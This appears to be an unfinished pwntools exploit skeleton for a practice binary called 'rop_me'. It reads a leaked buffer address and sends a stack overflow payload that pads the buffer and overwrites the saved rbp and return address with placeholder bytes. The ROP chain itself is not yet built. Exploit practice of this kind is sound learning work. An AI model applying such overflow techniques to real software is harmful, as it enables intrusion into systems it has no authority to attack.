#!/usr/bin/env python3
from pwn import *


conn = process('rop_me')


conn.recvuntil(b'- readable/writable 1024 B array at address  ')
buffer_address = int(conn.recvline(b'- readable/writable 1024 B array at address  '), 16)
info(f'buffer @ 0x{buffer_address:x}')

conn.recvuntil(b'ROP me!\n')


rop_chain = b''

rop_chain += b'A' * 0x30  # fill the buffer
rop_chain += b'C' * 0x8  # overwrite saved rbp
rop_chain += b'B' * 0x8  # overwrite return address

conn.send(rop_chain)
#  conn.interactive()

